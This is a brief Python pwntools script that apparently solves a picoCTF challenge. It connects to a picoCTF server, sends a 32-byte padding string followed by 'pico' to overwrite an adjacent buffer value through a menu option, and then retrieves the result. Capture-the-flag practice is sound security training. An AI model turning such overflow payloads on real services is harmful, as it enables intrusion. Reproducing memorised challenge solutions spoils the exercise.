from pwn import *

p = remote("tethys.picoctf.net", 56795)

payload = "a"*32 + "pico"

p.recvuntil("choice:")
p.sendline("2")
p.sendline(payload)

p.recvuntil("choice:")
p.sendline("4")

print(p.recvall())
